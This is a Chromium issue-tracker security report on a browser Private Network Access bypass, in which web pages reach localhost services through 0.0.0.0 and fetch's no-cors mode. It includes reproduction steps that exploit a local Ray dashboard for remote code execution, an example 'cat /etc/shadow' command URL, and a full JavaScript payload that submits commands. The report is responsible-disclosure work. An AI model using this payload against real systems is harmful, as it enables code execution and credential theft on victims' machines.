# Security: Private Network Access (PNA) Bypass Allows Access to localhost on macOS & Linux using 0.0.0.0

| Field | Value |
|-------|-------|
| **Issue ID** | [332410234](https://issues.chromium.org/issues/332410234) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>SecurityFeature>CORS>PrivateNetworkAccess |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **CVE IDs** | CVE-2023-48022 |
| **Reporter** | sa...@gmail.com |
| **Assignee** | es...@chromium.org |
| **Created** | 2024-04-02 |
| **Bounty** | $1,000.00 |

## Description

Security Bug

Please READ THIS FAQ before filing a bug: https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md

Please see the following link for instructions on filing security bugs: https://www.chromium.org/Home/chromium-security/reporting-security-bugs

Reports may be eligible for reward payments under the Chrome VRP: https://g.co/chrome/vrp

NOTE: Security bugs are normally made public once a fix has been widely deployed.

-------------------------

VULNERABILITY DETAILS
Please provide a brief explanation of the security issue.

Hi, we are submitting this issue after a meeting with Amy Ressler and consulting with her.

The browser allows accessing 0.0.0.0 from external domains together with the “no-cors” mode in the fetch API, which basically allows bypassing any CORS or private domain checks while enabling Javascript from less private domains.
0.0.0.0 is not considered a “more private” domain,  but it should be;

Usually, If you try to access more private domains from a public domain, it will fail due to the "More Private Domain" error;
For example, http://attacker.com cannot access:

🚫 localhost 
🚫 127.0.0.1
🚫 Hosts file records
🚫 192.168.X.X
🚫 10.10.X.X

But …. 0.0.0.0 is not considered "private", which compromises the private domains above:
✅ 0.0.0.0

By being available to attackers in external domains, the browser exposes all the interfaces above.
It enables attackers to bypass CORS, Firewalls, WAF, and IPTables rules - to execute code on services that bind on private, specific interfaces and should not be accessible to public domains via Javascript.

Suppose an attacker requests "mode: no-cors" in the fetch API. In that case, the attacker will successfully invoke HTTP requests to private services on private network interfaces, bypassing CORS and similar security mechanisms.

What is accessible to attackers?

Everything HTTP:
✅ Port-Forwarding to http services (developers)
✅ Services bound on localhost (Airtunes on MacOS, CUPS on Debian-based linux, Containers, Kubernetes API)
✅ Internal Network Access (VPN access if the DNS is public and known in advance via certificate transparency and OSINT tools)

VERSION
Chrome Version: 123.0.6312.87 (stable)
Operating System: Apple M3 Pro running MacOS Senoma 14.4 (23E214)
Verified on Ubuntu 22.04 as well (with Chrome's latest stable version);

REPRODUCTION CASE

There is a video attached as well;
First, run Ray in Localhost (to exploit CVE-2023-48022 in step 3 from the browser).

1. Install Ray
python3 -m pip install “ray[default]==2.8.0”

2. Run Ray on Localhost
$ python3
>>> import ray
>>> ray.init() 

ray.init() opens a dashboard (server) on localhost:8265;

Open the ray dashboard that is running on localhost on port 8265 (http://localhost:8265/api/jobs/)

3. Visit http://ports.sh:8265/  -  the attacker-controlled website. It will execute JavaScript that exploits the Ray service that runs in Localhost.

4. Optional - use a custom command via URI query parameters, just visit:
http://ports.sh:8265/rce?cmdline=cat /etc/shadow

You should be able to see the Jobs submitted to Ray, which was triggered using a single non-authorized HTTP request (and the lack of authorization is because Ray assumes it is running in a trusted environment which is Localhost).

The attacker controlled server should enable CORS ("*"), I used the following command to run it:

- sudo npm i -g http-server
- nohup http-server --cors -p 8265 &

Also, I am attaching the payload that I used in that example attacker-controlled website so that you can deploy it on any domain really as a script tag:

### BEGINNING OF EXAMPLE PAYLOAD
<script>
const cmdline = 'set && echo EXPLOITED!';

fetch('http://0.0.0.0:8265/api/jobs/', { mode: 'no-cors'})
  .then((blob) => {
console.log("Starting fetch POST");

var xhr = new XMLHttpRequest();
	xhr.open('POST', 'http://0.0.0.0:8265/api/jobs/', true);
	xhr.send(JSON.stringify({
        entrypoint: cmdline,
        runtime_env: {},
        job_id: null,
        metadata: { job_submission_id: 'test'}
    }));
    console.log('EXPLOITED!:', xhr.responseText);
  }).catch(()=>{
	alert("Ray is not running.");
});
</script>
### END OF EXAMPLE PAYLOAD

The live POC for this exploit is available at http://ports.sh:8265/

Expected Behavior:
1. Browsers might block requests to 0.0.0.0 if window.location is a non-private domain; like Localhost and 127.0.0.1
2. Browsers might disable “no-cors” mode to 0.0.0.0
It is also possible to make it an opt-in option via Chromium's Settings or via a command line flag that allows that, but in my opinion is should not be the default behavior, as we demonstrated this attack surface that bypasses critical security measurements.

Thanks a lot in advance,  we deeply appreciate your work.

CREDIT INFORMATION
Reporter credit: Avi Lumelsky, Uri Katz

## Attachments

- [chrome-1-click-rce-fast.mov](attachments/chrome-1-click-rce-fast.mov) (video/quicktime, 17.8 MB)
- [Browsers Localhost Bypass.pdf](attachments/Browsers Localhost Bypass.pdf) (application/pdf, 1.4 MB)
- [0.0.0.0 Day.jpg](attachments/0.0.0.0 Day.jpg) (image/jpeg, 54.8 KB)

## Timeline

### es...@chromium.org (2024-04-02)

Thanks for the report! This has already been publicly disclosed here: https://issues.chromium.org/issues/40058874, and also spec discussion here: https://github.com/WICG/private-network-access/issues/71

### pe...@google.com (2024-12-15)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### am...@chromium.org (2025-03-21)

Hi Avi, given that this was a known issue and the bypass was reported prior by not just one [1], but two [2], other reporters and the handling of 0.0.0.0 in Chromium was known and public issue being discussed in the public spec as far back as 2002 [3], we are unable extend a reward VRP reward for this report. We appreciate thoroughness of the demonstration for potential impact, are not able to issue a reward for a long since known and previously reported issue for which there is exhaustive public discussion and existing, ongoing plans to mitigate. Doing so would violate our policies but detract from original findings from the researcher who reported this issue back in 2022 to make us aware of the potential security consequences from our handling of 0.0.0.0.

[1] <https://crbug.com/40058874>
[2] <https://crbug.com/40063934>
[3] <https://github.com/WICG/private-network-access/issues/71#issue-1149117507>

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/332410234)*
